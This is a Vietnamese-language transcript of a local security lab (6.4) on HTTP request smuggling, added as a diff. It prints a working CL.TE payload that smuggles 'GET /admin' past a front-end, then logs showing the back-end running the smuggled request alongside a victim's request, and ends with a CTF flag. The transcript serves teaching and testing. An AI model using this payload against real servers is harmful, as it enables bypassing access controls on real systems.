@@ -1,0 +1,49 @@
+# Transcript lab 6.4 - HTTP request smuggling (CL.TE)
+# Demo tu chua: python3 demo.py
+# front-end 127.0.0.1:8050 (CL) + back-end 127.0.0.1:8051 (TE), 1 tien trinh
+# Ngay chay that: 2026-10-18 17:32:33
+# ============================================================
+
+================================================================
+PHAN A: cung 1 byte stream, hai tang frame ra KHAC NHAU (CL.TE)
+================================================================
+
+[payload tho gui vao]
+POST / HTTP/1.1
+Host: front
+Content-Length: 46
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: back
+Foo: bar
+
+[front-end frame theo Content-Length] -> thay 1 request:
+   req: POST / HTTP/1.1 | body 46 byte
+
+[back-end frame theo Transfer-Encoding] -> thay 2 request:
+   req: POST / HTTP/1.1 | body 0 byte
+   req: GET /admin HTTP/1.1 | body 0 byte
+
+=> Front thay 1 request; back thay 2 (co them 'GET /admin' bi smuggle).
+
+================================================================
+PHAN B: demo song - front(CL) + back(TE) dung chung 1 ket noi
+================================================================
+
+[1] Ke tan cong gui request CL.TE qua front-end...
+    back-end log sau buoc 1: ['POST / HTTP/1.1']
+    (phan 'GET /admin' con nam trong buffer back-end, cho request ke tiep)
+
+[2] Nan nhan gui request binh thuong 'GET /home' qua front-end...
+    back-end log sau buoc 2: ['POST / HTTP/1.1', 'GET /admin HTTP/1.1']
+
+=> Back-end da xu ly request 'GET /admin' KHONG ai gui truc tiep: CO (smuggling thanh cong)
+
+================================================================
+KET LUAN: FLAG{6.4_request_smuggling_CL.TE_desync}
+================================================================
+
+# (app socket da dong sau khi demo ket thuc; tien trinh thoat)
